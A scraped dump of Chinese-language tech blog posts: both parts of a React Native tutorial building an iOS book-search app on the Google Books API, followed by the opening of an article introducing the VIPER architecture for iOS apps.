<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/Na1pr3f.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<h2>搜索</h2>

<p>现在已经完成了精选标签的主从视图，我们将继续完善搜索选项卡，使用户能够利用 API 查询想要的书籍。</p>

<p>打开 SearchBooks.js 并按下面的代码修改。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');
var SearchResults = require('./SearchResults');
var {
    StyleSheet,
    View,
    Text,
    Component,
    TextInput,
    TouchableHighlight,
    ActivityIndicatorIOS
    } = React;

var styles = StyleSheet.create({
    container: {
        marginTop: 65,
        padding: 10
    },
    searchInput: {
        height: 36,
        marginTop: 10,
        marginBottom: 10,
        fontSize: 18,
        borderWidth: 1,
        flex: 1,
        borderRadius: 4,
        padding: 5
    },
    button: {
        height: 36,
        backgroundColor: '#f39c12',
        borderRadius: 8,
        justifyContent: 'center',
        marginTop: 15
    },
    buttonText: {
        fontSize: 18,
        color: 'white',
        alignSelf: 'center'
    },
    instructions: {
        fontSize: 18,
        alignSelf: 'center',
        marginBottom: 15
    },
    fieldLabel: {
        fontSize: 15,
        marginTop: 15
    },
    errorMessage: {
        fontSize: 15,
        alignSelf: 'center',
        marginTop: 15,
        color: 'red'
    }
});

class SearchBooks extends Component {

    constructor(props) {
        super(props);
        this.state = {
            bookAuthor: '',
            bookTitle: '',
            isLoading: false,
            errorMessage: ''
        };
    }


    render() {
        var spinner = this.state.isLoading ?
            ( &lt;ActivityIndicatorIOS
                hidden='true'
                size='large'/&gt; ) :
            ( &lt;View/&gt;);
        return (
            &lt;View style={styles.container}&gt;
                &lt;Text style={styles.instructions}&gt;Search by book title and/or author&lt;/Text&gt;
                &lt;View&gt;
                    &lt;Text style={styles.fieldLabel}&gt;Book Title:&lt;/Text&gt;
                    &lt;TextInput style={styles.searchInput} onChange={this.bookTitleInput.bind(this)}/&gt;
                &lt;/View&gt;
                &lt;View&gt;
                    &lt;Text style={styles.fieldLabel}&gt;Author:&lt;/Text&gt;
                    &lt;TextInput style={styles.searchInput} onChange={this.bookAuthorInput.bind(this)}/&gt;
                &lt;/View&gt;
                &lt;TouchableHighlight style={styles.button}
                                    underlayColor='#f1c40f'
                                    onPress={this.searchBooks.bind(this)}&gt;
                    &lt;Text style={styles.buttonText}&gt;Search&lt;/Text&gt;
                &lt;/TouchableHighlight&gt;
                {spinner}
                &lt;Text style={styles.errorMessage}&gt;{this.state.errorMessage}&lt;/Text&gt;
            &lt;/View&gt;
        );
    }

    bookTitleInput(event) {
        this.setState({ bookTitle: event.nativeEvent.text });
    }

    bookAuthorInput(event) {
        this.setState({ bookAuthor: event.nativeEvent.text });
    }

    searchBooks() {
        this.fetchData();
    }

    fetchData() {

        this.setState({ isLoading: true });

        var baseURL = 'https://www.googleapis.com/books/v1/volumes?q=';
        if (this.state.bookAuthor !== '') {
            baseURL += encodeURIComponent('inauthor:' + this.state.bookAuthor);
        }
        if (this.state.bookTitle !== '') {
            baseURL += (this.state.bookAuthor === '') ? encodeURIComponent('intitle:' + this.state.bookTitle) : encodeURIComponent('+intitle:' + this.state.bookTitle);
        }

        console.log('URL: &gt;&gt;&gt; ' + baseURL);
        fetch(baseURL)
            .then((response) =&gt; response.json())
            .then((responseData) =&gt; {
                this.setState({ isLoading: false});
                if (responseData.items) {

                    this.props.navigator.push({
                        title: 'Search Results',
                        component: SearchResults,
                        passProps: {books: responseData.items}
                    });
                } else {
                    this.setState({ errorMessage: 'No results found'});
                }
            })
            .catch(error =&gt;
                this.setState({
                    isLoading: false,
                    errorMessage: error
                }))
            .done();
    }

}

module.exports = SearchBooks;
</code></pre>

<p>述代码中，我们在构造函数中设置了一些属性：bookAuthor、bookTitle、isLoading 和 errorMessage。下面简要介绍下如何使用。</p>

<p>在 render()方法中，我们需要检查 isLoading 值是否为 true，如果是则建立一个活动指示器，否则则创建一个空视图（后面会用到）。然后，我们创建一个被用来插入查询的搜索表单。TextInput 用于接收输入。当组件的值改变时（例如用户键入一些文本），将会调用 TextInput 组件，同时为组件指定一个回调函数。在调用时，回调函数 bookTitleInput()和 bookAuthorInput()利用用户输入的数据将设置 bookAuthor 和 bookTitles 属性。当用户按下搜索按钮时，searchBooks()被调用。需要注意的是，React Native 没有按钮组件。所以，我们使用 TouchableHighlight 来代替，并用文本包装，使它的样式看起来像一个按钮。当按下搜索按钮时，根据输入的数据构成一个 URL。用户可以通过书名、作者或书名+作者进行搜索。如果结果成功返回，SearchResult 将被推到导航堆栈，否则提示错误消息。我们还将响应数据传递给 SearchResults 类。</p>

<p>创建一个文件并命名为 SearchResults.js，将下列代码贴进去。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');
var BookDetail = require('./BookDetail');
var {
    StyleSheet,
    View,
    Text,
    Component,
    TouchableHighlight,
    Image,
    ListView
    } = React;

var styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center'
    },
    title: {
        fontSize: 20,
        marginBottom: 8
    },
    author: {
        color: '#656565'
    },
    separator: {
        height: 1,
        backgroundColor: '#dddddd'
    },
    listView: {
        backgroundColor: '#F5FCFF'
    },
    cellContainer: {
        flex: 1,
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#F5FCFF',
        padding: 10
    },
    thumbnail: {
        width: 53,
        height: 81,
        marginRight: 10
    },
    rightContainer: {
        flex: 1
    }
});

class SearchResults extends Component {

    constructor(props) {
        super(props);

        var dataSource = new ListView.DataSource(
            {rowHasChanged: (row1, row2) =&gt; row1 !== row2});
        this.state = {
            dataSource: dataSource.cloneWithRows(this.props.books)
        };
    }

    render() {

        return (
            &lt;ListView
                dataSource={this.state.dataSource}
                renderRow={this.renderBook.bind(this)}
                style={styles.listView}
                /&gt;
        );
    }

    renderBook(book) {
        var imageURI = (typeof book.volumeInfo.imageLinks !== 'undefined') ? book.volumeInfo.imageLinks.thumbnail : '';

        return (
            &lt;TouchableHighlight onPress={() =&gt; this.showBookDetail(book)}
                                underlayColor='#dddddd'&gt;
                &lt;View&gt;
                    &lt;View style={styles.cellContainer}&gt;
                        &lt;Image
                            source={{uri: imageURI}}
                            style={styles.thumbnail} /&gt;
                        &lt;View style={styles.rightContainer}&gt;
                            &lt;Text style={styles.title}&gt;{book.volumeInfo.title}&lt;/Text&gt;
                            &lt;Text style={styles.author}&gt;{book.volumeInfo.authors}&lt;/Text&gt;
                        &lt;/View&gt;
                    &lt;/View&gt;
                    &lt;View style={styles.separator} /&gt;
                &lt;/View&gt;
            &lt;/TouchableHighlight&gt;
        );
    }

    showBookDetail(book) {

        this.props.navigator.push({
            title: book.volumeInfo.title,
            component: BookDetail,
            passProps: {book}
        });
    }

}

module.exports = SearchResults;
</code></pre>

<p>以上代码之前已经讨论过，也不再赘述。代码中获得数据，并将数据通过 props 属性传递到类，同时创建填充了数据的 ListView。</p>

<p>作者注意到，在 API中，当你按作者搜索时，结果不一定是书的数据，而是作者自身的信息。这意味着某些行的 book.volumeInfo.imageLinks.thumbnail 和 book.volumeInfo.description 有未定义的值。所以我们稍作检查，如果没有图像则显示一个空视图。否则，我们的应用将试图加载不存在的图像，这样会容易引发崩溃。</p>

<p>我们使用之前用过的 BookDetail 组件，来显示每本书的详细信息。如图所示，打开 BookDetail.js 并修改 render()函数。在用数据填充视图之前，检查传入的数据是否有相关图像和详细信息。如果尝试载入的书籍没有详情或图片，对应的区域将是空白。你可以向用户提示一个错误信息，在此我们省略该步骤。</p>

<pre><code>javascript</code><code class=""lang-javascript"">render() {
    var book = this.props.book;
    var imageURI = (typeof book.volumeInfo.imageLinks !== 'undefined') ? book.volumeInfo.imageLinks.thumbnail : '';
    var description = (typeof book.volumeInfo.description !== 'undefined') ? book.volumeInfo.description : '';
    return (
        &lt;View style={styles.container}&gt;
            &lt;Image style={styles.image} source={{uri: imageURI}} /&gt;
            &lt;Text style={styles.description}&gt;{description}&lt;/Text&gt;
        &lt;/View&gt;
    );
}
</code></pre>

<p>重载应用，会看到搜索书籍的界面。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/nLOYKeB.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<h2>结束语</h2>

<p>尽管仍在不断完善，React Native 看起来很有希望成为构建移动应用的另一种选择。它为 Web 开发人员开启了一扇门，让他们能够在移动开发领域一探究竟。同时为移动开发者提供了一种简化开发流程的新方式。</p>

<p>随着项目的发展，让我们拭目以待 React Native 和应用开发（iOS和Android ——或者别的平台）将会碰撞出什么样的火花。同时，如果你需要进一步确认网络技术是否能用于实现真正的原生体验，你可以看看这些由 React Native 构建的应用：Facebook Ads Manager（完全由 React Native 构建）以及 Facebook Groups（React Native 和 Objective-C 构建的混合应用）。</p>

<p>「学习一次，在任何地方应用」。单这一句足以证明学习 React Native 框架的意义。</p>

<p>你可以在这里下载完整示例项目。</p>

<p>为了更进一步了解 React Native，你可以参考下列视频和资料。</p>

<blockquote>
  <ul>
<li><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=KVZ-P-ZI6W4"">React Native 简介</a></li>
  <li><a rel=""nofollow"" href=""http://facebook.github.io/react-native/docs/getting-started.html"">深入 React Native</a></li>
  <li><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=X6YbAKiLCLU"">React Native 接力：将现代网页技术推向移动开发世界</a></li>
  </ul>
</blockquote>

<p>你可以在这下载 <a rel=""nofollow"" href=""https://github.com/appcoda/React-Native-Demo-App"">Xcode 项目</a>，仅供参考。（完结）</p>

<p><a rel=""nofollow"" href=""http://news.oneapm.com/react-native-introduction/"">React Native 简介：用 JavaScript 搭建 iOS 应用 (1)</a></p>

<p>原文地址：<a rel=""nofollow"" href=""http://www.appcoda.com/react-native-introduction/""></a><a rel=""nofollow"" href=""http://www.appcoda.com/react-native-introduction/"">http://www.appcoda.com/react-native-introduction/</a></p>

<p><strong>本文系 <a rel=""nofollow"" href=""http://oneapm.com/index.html?utm_source=Common&amp;utm_medium=Articles&amp;utm_campaign=TechnicalArticles&amp;from=matefiseco"">OneAPM</a> 工程师编译整理。想阅读更多技术文章，请访问 OneAPM <a rel=""nofollow"" href=""http://news.oneapm.com/?utm_source=TechCommunity&amp;utm_medium=TechArticle&amp;utm_campaign=JulSoftArti"">官方博客</a>。</strong></p>

                ", React Native 简介：用 JavaScript 搭建 iOS 应用(2),1531972100,252,1,635,1,1,https://segmentfault.com/a/1190000003088452
143,1,0,6,"
                    
<p><strong>【编者按】本篇文章的作者是 Joyce Echessa——渥合数位服务创办人，毕业于台湾大学，近年来专注于协助客户进行 App 软体以及网站开发。本篇文章中，作者介绍通过 React Native 框架构建一个示例应用的开发过程，使得网络技术和移动开发碰撞出绚丽火花，本文系 <a rel=""nofollow"" href=""http://www.oneapm.com/index.html?utm_source=Common&amp;utm_medium=Articles&amp;utm_campaign=TechnicalArticles&amp;from=matefiseco"">OneAPM</a> 工程师编译整理：</strong></p>

<p>我们已经了解像 Titanium 和 PhoneGap 等框架，它们能让开发者用 Web 技术构建移动应用。这是一个优势，支持开发者使用原先网络和移动开发的相关技术。不仅如此，相同的代码库经过小幅度的修改便能适用多个平台——这就是著名的「一次编写，到处运行」。然而，当涉及到构建应用的性能时，这些框架的缺点显露无遗，尽管它们有一些吸引力，但却一直更适用于构建原生应用。</p>

<p><span class=""img-wrap""><img data-src=""http://news.oneapm.com/content/images/2015/08/react-native-1024x631.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用""></span></p>

<p>React Native 却与众不同。像 PhoneGap 这样的框架是将网页内容包装成 WebView，导致 UI 元素并没有原生的感觉，而 React Native 则使用原生 iOS 或 Android 组件支持的 JavaScript 组件，所以你构建的应用是完全原生的。</p>

<p>Facebook 的汤姆 Occhino 在文章末尾链接视频中说，React Native 并非是「一次编写，到处运行」的框架。正如本教程所介绍，你使用特定平台的组件来构造 UI，所以并不能直接将同样的代码放到 Android 上运行。React Native 是让你学习这套技能，并可以用它在多种平台上搭建应用，Occhino 更进一步阐明，这其实是「一次编写，到处运行」的框架。在本文中，作者将介绍利用 React Native 框架构建一个简单应用的完整开发过程。</p>

<h2>开始吧！</h2>

<p>首先，介绍一下在开发机器上安装 React Native 的流程。</p>

<p>开始之前，应该提醒大家：你可以从 GitHub 获取 <a rel=""nofollow"" href=""https://github.com/facebook/react-native"">React Native</a> 框架代码。接着运行其中的示例项目，比如2048（游戏）、Movies （电影浏览器应用）、SampleApp（空白的 React Native 应用）、TicTacToe （游戏）和 UIExplorer（这个应用展现了所有可能用到的 React Native 组件，比如 ListView、TabBar、MapView、Slider 等）。这些应用能帮助你学习使用 React Native 构建 UI 元素，尤其是 UIExplorer 应用程序，它提供了你可能需要用到的每个 UI 元素。但是，有些应用程序还有 Bug，笔者在尝试运行时也出现过几次崩溃。尽管如此，它们仍然非常值得学习，如需详情，你可以了解下<a rel=""nofollow"" href=""http://facebook.github.io/react-native/docs/getting-started.html"">相关文档</a>。</p>

<p>现在开始安装。React native 利用 Node.js 来搭建 JavaScript 代码。如果你电脑上已经安装过，则可以跳过以下步骤，否则请继续以下步骤。</p>

<p>我们选择使用 Homebrew 来安装 Node.js 框架。虽然这不是安装 Node 的唯一方式，但我发现，Homebrew 是非常好用的包管理器。你可以用它很容易地安装最新或特定版本的包、使用不同版本的软件包、选择要使用的版本、更新和卸载包等。想要安装 Homebrew，可以直接去官网，按照网页页面顶部指令即可。由于链接可能会变，这里就不贴出下载链接了。</p>

<p>在 Homebrew 安装好后，粘贴以下指令到终端窗口以安装 Node.js。</p>

<pre><code>Swift</code><code>brew install node
</code></pre>

<p>接着安装 watchman。</p>

<pre><code>Swift</code><code>brew install watchman
</code></pre>

<p>Watchman 是 Facebook 的文件监控器。React Native 用它来检测代码变化，以便重新编译。</p>

<p>接着用下列指令安装 React Native CLI 工具。</p>

<pre><code>Swift</code><code>npm install -g react-native-cli
</code></pre>

<p>NPM 是 Node 的包管理器。你可以将它想象成 Ruby 中的 RubyGems、iOS 的 CocoaPods，以及 Java 中的 Gradle/Maven 等。它能够让你更容易地下载和管理项目所需的任何相关项。</p>

<p>在终端窗口，切换到你想要保存项目的文件夹，然后运行以下命令。</p>

<pre><code>Swift</code><code>react-native init BookSearch
</code></pre>

<p>以上是用 CLI 工具来构建一个可以编译和运行的 React Native 项目。当这个过程完成后，你会收到来自终端窗口的消息，在 Xcode 中打开 BookSearch.xcodeproj，并照常运行该应用程序。接下来模拟器将启动你的应用，此外，将再打开一个终端窗口。当一个 React Native 应用启动时，它将从以下网址加载 JavaScript 程序。</p>

<pre><code>Swift</code><code>http://localhost:8081/index.ios.bundle
</code></pre>

<p>终端窗口打开后，会启动 React Packager，并由服务器处理以上请求。React Packager 负责读取并构建 JSX（之后会介绍）和 JavaScript 代码。</p>

<p><span class=""img-wrap""><img data-src=""http://news.oneapm.com/content/images/2015/08/react-native-console.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用""></span></p>

<p>运行应用时，你会看到下图的模拟器。如果你要在设备上运行，应该按照以下几个步骤。</p>

<p><span class=""img-wrap""><img data-src=""http://news.oneapm.com/content/images/2015/08/pic01.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用""></span></p>

<p>顺便说一句，你应该注意欢迎界面给出的关键指令：通过编辑创建项目时生成的 index.ios.js 文件，编辑应用的用户界面，如果你修改了 JavaScript 代码，用 Command-R 加载应用程序，看看有什么变化。如果你想要更多选择，使用 Command-Control-Z 打开开发者功能表，它提供启用时重新加载、浏览器调试等选项。</p>

<p><span class=""img-wrap""><img data-src=""http://news.oneapm.com/content/images/2015/08/pic02.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用""></span></p>

<p>当你按照本文操作，模拟器上却突然出现一个红色屏幕时，不妨检查一下模拟器上的错误消息。通过检查可以排查出问题是出自代码还是服务器。作者也曾经遇到几次服务器连接失败的情况，由模拟器反馈的错误消息是「无法连接到服务器」，然而检查终端时得到「进程终止」的错误消息。面对这种情况时，需要关闭终端窗口，停止在 Xcode 上的应用，并重新运行。对于其他错误比如代码中的语法错误、网络请求超时错误（如果你的应用是从网络获取数据），在修正错误后再重新加载应该就可以了。</p>

<p>如果在键盘上按下 Command-R 没什么用，那么键盘可能没能连接到模拟器。从模拟器功能表中选择硬件&gt;键盘&gt;连接硬件键盘，便能成功连接。</p>

<p>如果你已经完成以上步骤，却仍没有重新加载，那么可能需要重新启动计算机。笔者曾经遇到过一次奇葩经历，项目运行一切正常，但却突然停止工作，重新启动后又恢复正常。</p>

<p>现在开始构建我们的应用。打开 index.ios.js 文件。作者推荐使用适用于 Web 开发的 IDE。当然你也可以使用 Xcode，但不久你会发现它并不是很适合。当你需要代码格式化时，它的用处不大，无法自动填充或语法错误高亮。对于适合的 JavaScriptIDE，你可以通读本文后再做决定。我用的是 RubyMine，事实上只要是支持 JavaScript 的任何 IDE 都行，如果你选择一个还能支持 JSX 的那会更好。</p>

<p>当打开 index.ios.js 文件时，你会发现这些代码构建的是执行应用时所看到的 UI。</p>

<pre><code>JavaScript</code><code>'use strict';
</code></pre>

<p>上述代码开启了 Strict Mode，这将为 React Native 中的 JavaScript 代码加入了改良的错误处理能力。</p>

<pre><code>JavaScript</code><code>var React = require('react-native');
</code></pre>

<p>上述代码载入 react-native 模块，并将其分配给 React 变量。在你可以调用模块的所有功能之前，必须加载外部模块到项目文件。就像在 Swift 和 Objective-C 中导入库。</p>

<pre><code>JavaScript</code><code>var {
  AppRegistry,
  StyleSheet,
  Text,
  View,
} = React;
</code></pre>

<p>以上代码被称作解构赋值，能够让你分配多个对象属性到一个单变量。使得这些属性可以在整个文件范围中引用。以上代码是可选的，但如果你省略不要，那么每当你在代码中使用一个组件时，你必须使用其完整名称，例如「React.AppRegistry」、「React.StyleSheet」而不是 「AppRegistry」、「StyleSheet」。</p>

<pre><code>JavaScript</code><code>var BookSearch = React.createClass({
  render: function() {
    return (
      &lt;View style={styles.container}&gt;
        &lt;Text style={styles.welcome}&gt;
          Welcome to React Native!
        &lt;/Text&gt;
        &lt;Text style={styles.instructions}&gt;
          To get started, edit index.ios.js
        &lt;/Text&gt;
        &lt;Text style={styles.instructions}&gt;
          Press Cmd+R to reload,{'\n'}
          Cmd+Control+Z for dev menu
        &lt;/Text&gt;
      &lt;/View&gt;
    );
  }
});
</code></pre>

<p>上面代码创建了只有单一函数 render()的类。无论 render 中定义了什么，都将被输出到屏幕。上述代码使用 JSX（JavaScript 语法扩展）来构建应用的用户界面。如果你之前已经使用 XML（甚至 HTML），那么对 JSX 应该不陌生。它同样需要使用开始、结束标记，在标记中使用属性来设置数值。React Native 不必非得使用 JSX，你可以用普通的 JavaScript，但笔者更推荐 JSX，因为它简化了定义的树结构的过程。如果你需要大量的代码构建 UI，通过庞大的 JSX 树结构使代码可读性更强。</p>

<pre><code>JavaScript</code><code>var styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#F5FCFF',
  },
  welcome: {
    fontSize: 20,
    textAlign: 'center',
    margin: 10,
  },
  instructions: {
    textAlign: 'center',
    color: '#333333',
    marginBottom: 5,
  },
});
</code></pre>

<p>以上代码是应用于视图内容的样式。如果你以前做过网络开发，而且使用过 CSS（层叠样式表），那么这应该很熟悉。React Native 使用 CSS 设定应用的用户界面。再看一眼 JSX 代码，你会发现每个样式都各有用途，例如 style={} styles.container 为容器定义样式，容器是用来容纳其他 UI 组件的外部视图。</p>

<pre><code>JavaScript</code><code>AppRegistry.registerComponent('BookSearch', () =&gt; BookSearch);
</code></pre>

<p>上行代码定义了应用的入口。也就是 JavaScript 代码开始执行的地方。</p>

<p>这是 React Native 用户界面的基础结构。每个定义的视图将会遵循这一基础结构。</p>

<p>在本篇文章中，我们将创建一个示例应用，可以浏览书籍，并看到详细信息比如作者、标题、该书简介。你也可以在应用中搜索书名和作者。下图是该应用的成品图，数据用的是 Google 书籍 API。</p>

<p><span class=""img-wrap""><img data-src=""http://news.oneapm.com/content/images/2015/08/pic03.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用""></span></p>

<h2>添加标签栏</h2>

<p>示例应用将有两个项目的标签栏——精选和搜索。我们首先添加该功能。</p>

<p>虽然你可以在 index.ios.js 中编写所有代码，但这种做法并不推荐，随着应用代码量的增加，整个框架容易变得混乱不堪。为了更便于管理，我们在不同的文件中创建类。</p>

<p>在项目中根目录中创建两个 JavaScript 文件（与 index.ios.js 文件在相同位置）。命名这两个文件为 Search.js 和 Featured.js。打开 Featured.js 并添加以下代码。</p>

<pre><code>Xcode</code><code>'use strict';

var React = require('react-native');

var {
    StyleSheet,
    View,
    Text,
    Component
   } = React;

var styles = StyleSheet.create({
    description: {
        fontSize: 20,
        backgroundColor: 'white'
    },
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center'
    }
});

class Featured extends Component {
    render() {
        return (
       &lt;View style={styles.container}&gt;
        &lt;Text style={styles.description}&gt;
           Featured Tab
        &lt;/Text&gt;
    &lt;/View&gt;
        );
    }
}

module.exports = Featured;

</code></pre>

<p>这段代码你应该非常熟悉，非常类似于我们前面的代码。我们设置 Strict Mode、加载 react-native 模块、创建视图样式并用 render()函数渲染输出到用户界面。代码的最后一行输出精选类，从而使其可用于其他文件。请注意，我们声明类和函数的方式，略微不同于示例 inindex.ios.js 文件。JavaScript 有不同的声明类和函数的方式。随意选择你喜欢的风格。本篇文章接下来，我们将一直沿用上面所使用的样式。</p>

<p>在样式表定义中，我们可以看到基本的 CSS 属性。我们为外部视图中的文本和中心内容，设置字体大小和背景颜色。但你可能不熟悉 <code>flex: 1</code> 这行，这是最近才增加到 CSS 规范中的 flexbox。这里的 <code>flex: 1</code> 使得标记为容器的元素只占用的屏幕中的剩余空间，也就是只占用适应其内容的足够空间。之后我们会进一步介绍 Flex。要了解更多关于 Flexbox 样式，你可以参考这个指南。</p>

<p>在 Search.js 中添加下面代码。</p>

<pre><code>javaScript</code><code>'use strict';

var React = require('react-native');

var {
    StyleSheet,
    View,
    Text,
    Component
   } = React;

var styles = StyleSheet.create({
    description: {
        fontSize: 20,
        backgroundColor: 'white'
    },
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center'
    }
});

class Search extends Component {
    render() {
        return (
        &lt;View style={styles.container}&gt;
            &lt;Text style={styles.description}&gt;
              Search Tab
            &lt;/Text&gt;
        &lt;/View&gt;
        );
    }
}

module.exports = Search;
</code></pre>

<p>上面的代码与 Featured.js 的代码很像，除了文本控件中的文字。</p>

<p>删除 index.ios.js 中的所有内容，将下面的代码粘贴进去。</p>

<pre><code>javascript</code><code>'use strict';

var React = require('react-native');
var Featured = require('./Featured');
var Search = require('./Search');

var {
    AppRegistry,
    TabBarIOS,
    Component
   } = React;

class BookSearch extends Component {

    constructor(props) {
        super(props);
        this.state = {
            selectedTab: 'featured'
        };
    }

    render() {
        return (
            &lt;TabBarIOS selectedTab={this.state.selectedTab}&gt;
                &lt;TabBarIOS.Item
                    selected={this.state.selectedTab === 'featured'}
                    icon={{uri:'featured'}}
                    onPress={() =&gt; {
                        this.setState({
                            selectedTab: 'featured'
                        });
                    }}&gt;
                    &lt;Featured/&gt;
                &lt;/TabBarIOS.Item&gt;
                &lt;TabBarIOS.Item
                    selected={this.state.selectedTab === 'search'}
                    icon={{uri:'search'}}
                    onPress={() =&gt; {
                        this.setState({
                            selectedTab: 'search'
                        });
                    }}&gt;
                    &lt;Search/&gt;
                &lt;/TabBarIOS.Item&gt;
            &lt;/TabBarIOS&gt;
        );
    }
}

AppRegistry.registerComponent('BookSearch', () =&gt; BookSearch);

</code></pre>

<p>此时，我们需要之前创建文件中导出的两个模块，并将它们分配给变量。在类中，我们指定一个构造函数，用来设置类的状态。所使用的组件均有状态变量，然后创建一个名为 selectedTab 的属性，并将其值赋给「featured」。我们将利用「featured」来确定选项卡是否有效。最后为 Featured 标签设定默认值。(未完待续...)</p>

<p><strong>敬请持续关注：《React Native 简介：用 JavaScript 搭建 iOS 应用》系列(2)(3).</strong></p>

<p>原文地址：<a rel=""nofollow"" href=""http://www.appcoda.com/react-native-introduction/""></a><a rel=""nofollow"" href=""http://www.appcoda.com/react-native-introduction/"">http://www.appcoda.com/react-native-introduction/</a></p>

<p><strong>本文系 <a rel=""nofollow"" href=""http://oneapm.com/index.html?utm_source=Common&amp;utm_medium=Articles&amp;utm_campaign=TechnicalArticles&amp;from=matefiseco"">OneAPM</a> 工程师编译整理。想阅读更多技术文章，请访问 OneAPM <a rel=""nofollow"" href=""http://news.oneapm.com/?utm_source=TechCommunity&amp;utm_medium=TechArticle&amp;utm_campaign=JulSoftArti"">官方博客</a>。</strong></p>

                ", React Native 简介：用 JavaScript 搭建 iOS 应用 (1),1531972102,312,1,833,1,1,https://segmentfault.com/a/1190000003076518
144,1,0,6,"
                    
<p><strong>【编者按】本篇文章由 Jeff Gilbert 和 Conrad Stoll 共同编写，通过构建一个基础示例应用，深入了解 VIPER，并从视图、交互器等多个部件理清 VIPER 的整体布局及思路。通过 VIPER 构建 iOS 应用架构，提升应用质量，迎接应用构建的新机遇！本文系 <a rel=""nofollow"" href=""http://oneapm.com/index.html?utm_source=Common&amp;utm_medium=Articles&amp;utm_campaign=TechnicalArticles&amp;from=matefiseco"">OneAPM</a> 工程师编译整理</strong></p>

<p>众所周知，在建筑领域，我们塑造自己的建筑，而建筑也反过来影响我们。对于程序员来说，在构建软件方面这个道理也同样适用。</p>

<p>在编程的过程中，让代码具备可读性是非常重要的，除此之外代码还要具备明确的目的、在逻辑方面能和其他代码协调一致。这就是我们常说的软件架构。好的架构不能保证产品成功，但它却会使产品便于维护，不至于让读到的人抓狂。</p>

<p>在这篇文章中，作者将介绍一种在 iOS 应用中适用的方法，名为 <a rel=""nofollow"" href=""http://mutualmobile.github.io/blog/2013/12/04/viper-introduction/"">VIPER</a>。 VIPER 已经被用来构建许多大型项目，但这篇文章的目的，是通过建立一个待办事项的应用来深入了解 VIPER。你可以在 GitHub 上找到<a rel=""nofollow"" href=""https://github.com/objcio/issue-13-viper"">示例项目</a>。</p>

<h2>什么是VIPER？</h2>

<p>测试并不总是开发 iOS 应用的重要组成部分。当作者在 <a rel=""nofollow"" href=""https://github.com/mutualmobile/"">Mutual Mobile</a> 寻求提高测试实践的办法时，发现为 iOS 应用程序编写测试并不容易。作者意识到，如果要找到提高测试软件的方法，首先需要想出更好的应用架构。于是把这更好的方法称作 VIPER。</p>

<p>VIPER 是 iOS 程序的<a rel=""nofollow"" href=""http://blog.8thlight.com/uncle-bob/2012/08/13/the-clean-architecture.html"">整洁架构</a>。它是指 View、Interactor、Presenter、Entity 和 Routing。整洁的体系结构将应用程序的逻辑分配到不同的责任区。这使得依赖关系（例如数据库）更容易独立，更便于测试层与层之间的相互作用。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/0I0kA4B.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""用VIPER构建iOS应用架构""></span></p>

<p>大多数 iOS 应用正在使用 MVC（模型—视图—控制器）架构。使用 MVC 作为一个程序的体系结构，可以引导你思考各个类是一个模型、视图或控制器。由于大部分应用程序逻辑不属于模型或视图，而是通常在控制器中结束。这便导致了所谓的大规模视图控制器，其视图控制器最终变得繁复巨大。为这些庞大的视图控制器减负是 iOS 开发者必须面对的问题，也是提高代码质量的巨大挑战。</p>

<p>通过定位程序逻辑和导航相关的代码，VIPER 的不同层可以帮助解决这个难题。随着 VIPER 的应用，「待办事项」列表实例中，你会发现视图控制器变得纤小、匀称。视图控制器的代码和所有类都容易理解和测试，更有利于后期维护。</p>

<h2>基于用例的应用设计</h2>

<p>应用程序常常实现为一组用例。用例被称为验收标准或行为，它同时描述了程序目的。一个列表可能需要按日期、类型或名称进行排序，这就是一个用例。用例是程序的逻辑责任层，应独立于用户接口实现，它们应该是小巧而明确的。决定如何将一个复杂程序拆分成较小的用例是具有挑战性的，同时需要积累实践经验。但它能有效地限制各个问题和类的范围。</p>

<p>用 VIPER 构建应用程序，需要实现一系列组件来满足每个用例。应用逻辑是实现用例的重要且非唯一的组成部分。用例也会影响用户界面。此外，需要考虑用例怎样结合核心部件，比如网络和数据持久性。在用例中，组建就像插件，VIPER 用来描述组件功能，以及它们之间彼此交互的方式。</p>

<p>待办事项应用程序的一个用例或要求就是基于用户选择，对待办事项进行分组。通过将数据转换成用例的逻辑进行分离，我们能够保持用户接口代码的整洁性，方便在测试中包装用例，来确保它以正常方式继续工作。</p>

<h2>VIPER 的主要组件</h2>

<p>VIPER 的主要组件有以下部分：</p>

<blockquote>
  <ul>
<li>视图：显示展示器的要求，并返回用户输入。</li>
  <li>交互器：包含用例指定的业务逻辑。</li>
  <li>展示器：包含视图逻辑用于准备显示内容（从交互器接收的）并反馈用户输入（通过显示器请求最新数据）。</li>
  <li>实体：包含交互器所用的基本模型对象。</li>
  <li>路由：包含导航逻辑来描述屏幕出现的顺序。</li>
  </ul>
</blockquote>

<p>这种分离也符合<a rel=""nofollow"" href=""http://www.objectmentor.com/resources/articles/srp.pdf"">单一责任原则</a>。交互器担任业务分析师，展示器则成了交互设计师，视图负责可视化设计。</p>

